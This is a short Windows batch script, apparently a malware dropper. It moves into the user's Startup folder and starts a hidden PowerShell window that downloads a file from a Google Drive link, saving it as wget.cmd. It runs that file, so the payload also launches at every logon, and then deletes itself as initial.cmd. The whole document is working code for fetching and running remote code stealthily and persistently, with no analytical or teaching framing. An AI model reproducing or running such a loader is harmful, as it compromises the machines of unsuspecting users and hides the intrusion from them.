@echo off
@REM author vadill0

set "VAR=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd "%STARTUP%"

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://drive.google.com/file/d/1uSz1ypRtIMx0nZuy4VhFI4fCulHKLYwE/view?usp=sharing -OutFile wget.cmd"

powershell ./wget.cmd

cd "%VAR%"
del initial.cmd